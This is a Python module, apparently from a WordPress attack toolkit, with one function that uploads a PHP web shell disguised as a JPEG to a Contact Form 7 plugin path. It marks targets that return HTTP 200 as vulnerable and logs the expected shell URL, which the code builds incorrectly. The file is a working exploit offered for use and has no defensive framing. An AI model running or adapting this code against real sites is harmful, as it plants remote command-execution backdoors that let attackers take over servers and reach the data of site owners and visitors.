import sys
import os
try:
    # The insertion index should be 1 because index 0 is this file
    sys.path.insert(1, '{}/help'.format(
        os.getcwd()))  # the type of path is string
    # because the system path already have the absolute path to folder a
    # so it can recognize file_a.py while searching
    from help.banner import colors
    from help.json_me import json_me
    from help.req import request

except (ModuleNotFoundError, ImportError) as e:
    print("{} fileure".format(type(e)))
else:
    print("Import succeeded")


def exploit(url):
    found = []
    req = request(url)
    if not (url.startswith('https://') or url.startswith('http://')):
        url = 'http://' + url
    try:
        shell = "GIF89a;<?php system($_GET['cmd']); ?>"
        file_name = "file.jpg"
        files = {'zip': (file_name, shell, 'text/html')}
        url = "{}/wp-content/plugins/contact-form-7/modules/file.php".format(
            url)
        r = req.post(url, files=files)
        if r.status_code == 200:
            print(colors.yellow +
                  "[+] ==> Contact form upload exploit %s Vulnerable" % url)
            found.append({
                "url":
                url,
                "payload":
                r.url,
                "status":
                r.status_code,
                "exploit":
                "upload_exploit",
                "shell":
                "http://{}/wp-content/plugins/contact-form-7/file.jpg".format(
                    url)
            })
            json_me(url, "upload_exploit", found)
        else:
            print(colors.red +
                  "[-] Contact Form upload exploit  ==> %s Not Vulnerable" %
                  url)

    except Exception as e:
        print("[-] upload_exploit ==> %s Not Working" % e)
        pass
